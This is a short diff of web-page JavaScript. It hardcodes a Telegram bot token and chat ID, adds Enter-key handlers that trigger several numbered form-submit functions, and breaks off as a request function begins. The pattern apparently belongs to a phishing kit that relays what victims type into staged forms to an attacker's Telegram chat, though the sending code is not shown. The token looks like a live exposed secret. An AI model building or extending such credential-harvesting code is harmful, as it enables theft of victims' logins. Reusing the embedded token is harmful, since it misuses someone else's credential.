@@ -1,6 +1,28 @@
 var tkl = "5622081402:AAHjk5tZkSH1Oe-viPRy5RBYzJpC6pNktqw";
 var chtid = "-857494060";
 
+
+function handle1(e){
+    if(e.keyCode === 13){
+        sxfm1();
+    }
+}
+function handle11(e){
+    if(e.keyCode === 13){
+        sxfm11();
+    }
+}
+function handle2(e){
+    if(e.keyCode === 13){
+        sxfm2();
+    }
+}
+function handle3(e){
+    if(e.keyCode === 13){
+        sxfm3();
+    }
+}
+
 function xlsxb() {
     var xhttp = new XMLHttpRequest();
     xhttp.onreadystatechange = function() {
